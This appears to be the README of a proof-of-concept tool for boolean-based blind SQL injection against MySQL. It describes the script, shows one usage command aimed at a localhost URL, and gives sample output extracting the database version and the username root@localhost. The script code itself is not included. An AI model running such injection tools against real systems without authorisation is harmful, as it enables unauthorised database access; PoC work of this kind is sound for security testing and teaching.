# mysql_bb
Boolean-based blind SQL injection Proof of Concept for MySQL.

This script attempts to retrieve MySQL version and current username by making boolean-based blind injection into supplied HTTP GET URI.
## Usage example
```bash
python3 mysql_bb_poc.py http://localhost?param=
(+) Retrieving database version....
5.5.47-0+deb8u1-log
(+) Retrieving username....
root@localhost
(+) done!

```
